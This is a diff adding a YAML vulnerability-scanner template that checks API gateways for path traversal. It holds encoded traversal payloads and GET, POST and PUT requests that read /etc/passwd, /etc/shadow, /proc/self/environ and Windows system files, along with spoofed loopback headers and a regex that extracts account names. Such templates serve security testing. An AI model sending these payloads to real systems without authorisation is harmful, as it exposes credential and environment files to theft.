@@ -1,0 +1,216 @@
+id: api-gateway-path-traversal
+
+info:
+  name: API Gateway Path Traversal - Encoded Payload Variations
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced path traversal detection for API gateways using multiple encoding techniques.
+    Tests various encoding methods including URL, Unicode, UTF-8, and double encoding bypasses.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://portswigger.net/web-security/file-path-traversal
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
+    cvss-score: 8.2
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 25
+  tags: api,gateway,path-traversal,lfi,encoding
+
+variables:
+  payloads:
+    - "../../../etc/passwd"
+    - "..%2f..%2f..%2fetc%2fpasswd"
+    - "..%252f..%252f..%252fetc%252fpasswd"
+    - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+    - "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
+    - "..%u002f..%u002f..%u002fetc%u002fpasswd"
+    - "....//....//....//etc//passwd"
+    - "..\\..\\..\\etc\\passwd"
+    - "..%5c..%5c..%5cetc%5cpasswd"
+    - "..%255c..%255c..%255cetc%255cpasswd"
+
+http:
+  - method: GET
+    path:
+      # Standard path traversal with various encodings
+      - "{{BaseURL}}/api/v1/files?path=../../../etc/passwd"
+      - "{{BaseURL}}/api/v1/files?file=..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/api/v1/files?filename=..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}/api/v1/download?path=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      
+      # Unicode encoding bypasses
+      - "{{BaseURL}}/api/v1/files?path=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
+      - "{{BaseURL}}/api/v1/files?file=..%u002f..%u002f..%u002fetc%u002fpasswd"
+      
+      # Double slash bypasses
+      - "{{BaseURL}}/api/v1/files?path=....//....//....//etc//passwd"
+      - "{{BaseURL}}/api/v1/files?file=....%2f%2f....%2f%2f....%2f%2fetc%2f%2fpasswd"
+      
+      # Windows-style path separators
+      - "{{BaseURL}}/api/v1/files?path=..\\..\\..\\etc\\passwd"
+      - "{{BaseURL}}/api/v1/files?file=..%5c..%5c..%5cetc%5cpasswd"
+      - "{{BaseURL}}/api/v1/files?filename=..%255c..%255c..%255cetc%255cpasswd"
+      
+      # Null byte injection
+      - "{{BaseURL}}/api/v1/files?path=../../../etc/passwd%00"
+      - "{{BaseURL}}/api/v1/files?file=../../../etc/passwd%00.txt"
+      - "{{BaseURL}}/api/v1/files?filename=../../../etc/passwd%00.jpg"
+      
+      # Path parameter in URL path
+      - "{{BaseURL}}/api/v1/files/../../../etc/passwd"
+      - "{{BaseURL}}/api/v1/files/..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/api/v1/download/..%252f..%252f..%252fetc%252fpasswd"
+      
+      # Base64 encoded paths
+      - "{{BaseURL}}/api/v1/files?path={{base64('../../../etc/passwd')}}"
+      - "{{BaseURL}}/api/v1/files?file={{base64('..%2f..%2f..%2fetc%2fpasswd')}}"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (compatible; PathTraversal-Scanner)"
+      Accept: "*/*"
+      X-Forwarded-For: "127.0.0.1"
+      X-Real-IP: "127.0.0.1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:x:"
+          - "daemon:x:"
+          - "bin:x:"
+          - "sys:x:"
+          - "nobody:x:"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "/sbin/nologin"
+        condition: or
+
+      - type: word
+        negative: true
+        words:
+          - "404"
+          - "403"
+          - "Not Found"
+          - "Access Denied"
+          - "Forbidden"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: passwd_entries
+        regex:
+          - "([a-zA-Z0-9_-]+):x?:[0-9]+:[0-9]+:.*?:/.*?:/.*"
+        group: 1
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/files/read"
+      - "{{BaseURL}}/api/v1/download"
+      - "{{BaseURL}}/api/v1/file-manager"
+
+    headers:
+      Content-Type: "application/json"
+      Accept: "application/json"
+
+    body: |
+      {
+        "path": "../../../etc/passwd",
+        "filename": "..%2f..%2f..%2fetc%2fpasswd",
+        "file": "..%252f..%252f..%252fetc%252fpasswd",
+        "directory": "../../../etc/",
+        "resource": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "root:"
+          - "daemon:"
+          - "bin:"
+          - "/bin/bash"
+        condition: or
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/v1/files"
+
+    headers:
+      Content-Type: "application/json"
+
+    body: |
+      {
+        "action": "read",
+        "target": "../../../etc/passwd",
+        "path": "..%2f..%2f..%2fetc%2fpasswd"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:"
+          - "daemon:"
+        condition: or
+
+  - method: GET
+    path:
+      # Windows system files
+      - "{{BaseURL}}/api/v1/files?path=../../../windows/system32/drivers/etc/hosts"
+      - "{{BaseURL}}/api/v1/files?file=..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"
+      - "{{BaseURL}}/api/v1/files?path=../../../boot.ini"
+      - "{{BaseURL}}/api/v1/files?file=..%5c..%5c..%5cboot.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "127.0.0.1"
+          - "localhost"
+          - "[boot loader]"
+          - "multi(0)"
+        condition: or
+
+  - method: GET
+    path:
+      # Configuration files
+      - "{{BaseURL}}/api/v1/files?path=../../../etc/hosts"
+      - "{{BaseURL}}/api/v1/files?file=../../../etc/shadow"
+      - "{{BaseURL}}/api/v1/files?path=../../../etc/group"
+      - "{{BaseURL}}/api/v1/files?file=../../../proc/version"
+      - "{{BaseURL}}/api/v1/files?path=../../../proc/self/environ"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "127.0.0.1"
+          - "localhost"
+          - "Linux version"
+          - "PATH="
+          - "root:"
+        condition: or
